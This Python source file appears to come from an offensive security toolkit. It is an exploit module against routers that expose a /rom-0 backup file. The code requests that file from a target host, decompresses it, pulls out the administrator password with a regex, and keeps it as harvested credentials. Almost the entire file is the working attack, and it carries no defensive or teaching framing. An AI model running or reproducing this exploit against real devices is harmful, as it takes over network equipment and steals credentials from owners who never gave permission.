#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import re
import requests

from .deps.lzs_decompress import LZSDecompress, RingList
from .badges import Badges


class Exploit(Badges):
    credentials = list()

    def exploit(self, host):
        self.print_process(f"({host}) - exploiting ...")
        try:
            response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
            self.print_success(f"({host}) - device vulnerable!")
        except Exception:
            self.print_error(f"({host}) - device not vulnerable!")
            return

        self.print_process(f"({host}) - accessing rom ...")
        if response.status_code == 200:
            self.print_process(f"({host}) - extrating password ...")
            data = response.content[8568:]
            result, window = LZSDecompress(data, RingList(2048))

            password = re.findall("([\040-\176]{5,})", result)
            if password[0]:
                self.credentials.append(f"({host}) - admin:{password[0]}")
            else:
                self.print_warning(f"({host}) - no password obtained.")
        else:
            self.print_error(f"({host}) - rom access denied!")
